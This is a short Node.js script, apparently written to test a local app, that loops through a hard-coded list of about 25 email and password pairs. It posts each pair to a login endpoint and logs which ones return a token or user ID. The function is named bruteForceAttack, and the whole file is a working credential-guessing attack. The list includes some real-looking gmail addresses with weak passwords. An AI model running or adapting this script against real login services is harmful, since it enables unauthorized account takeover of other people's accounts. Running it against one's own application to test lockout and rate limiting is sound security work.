const axios = require("axios");

const url = "http://localhost:5000/api/user/login"; // Replace with your login endpoint
const credentialsList = [
  { email: "admin@gmail.com", password: "password123" },
  { email: "tes@gmail.com", password: "tes" },
  { email: "guest@gmail.com", password: "guest123" },
  { email: "asad@gmail.com", password: "password" },
  { email: "randomuser1@example.com", password: "securePass1!" },
  { email: "randomguy2@example.com", password: "P@ssword2$" },
  { email: "unique3@example.com", password: "uniquepass3#" },
  { email: "random123@example.com", password: "rand0mP@ss4" },
  { email: "testperson5@example.com", password: "Te$tp5ss" },
  { email: "another6@example.com", password: "A!nother6p" },
  { email: "example7@example.com", password: "Exam7ple!" },
  { email: "dummy8@example.com", password: "DumMy8@pass" },
  { email: "tempuser9@example.com", password: "T3mpPass9" },
  { email: "random10@example.com", password: "Ran10dom*" },
  { email: "unique11@example.com", password: "Un!que11$" },
  { email: "rand12@example.com", password: "R@nd0m12" },
  { email: "temp13@example.com", password: "T3mpP@ss13" },
  { email: "secure14@example.com", password: "Sec!ure14" },
  { email: "authentic15@example.com", password: "Auth15P@ss" },
  { email: "genius16@example.com", password: "Gen16ius*" },
  { email: "random17@example.com", password: "Ran17dom!" },
  { email: "testcase18@example.com", password: "Te$tc18ase" },
  { email: "yuvraj@gmail.com", password: "password" },
  { email: "user19@example.com", password: "Use19rP@ss" },
  { email: "randome20@example.com", password: "R@nd0me20" },
];

async function bruteForceAttack() {
  for (const creds of credentialsList) {
    try {
      console.log(`Attempting: ${JSON.stringify(creds)}`);
      const response = await axios.post(url, creds, {
        headers: { "Content-type": "application/json" },
      });

      // Check if response contains token or user ID to determine success
      if (response.data.token || response.data._id) {
        console.log(`Success! Credentials: ${JSON.stringify(creds)}`);
        console.log(`Response: ${JSON.stringify(response.data)}`);
      } else {
        console.log(
          `Failed: ${JSON.stringify(creds)} | Response: ${JSON.stringify(
            response.data
          )}`
        );
      }
    } catch (error) {
      if (error.response) {
        console.log(
          `Failed: ${JSON.stringify(creds)} | Status: ${
            error.response.status
          } | Response: ${JSON.stringify(error.response.data)}`
        );
      } else {
        console.log(
          `Failed: ${JSON.stringify(creds)} | Error: ${error.message}`
        );
      }
    }
  }
}

bruteForceAttack();
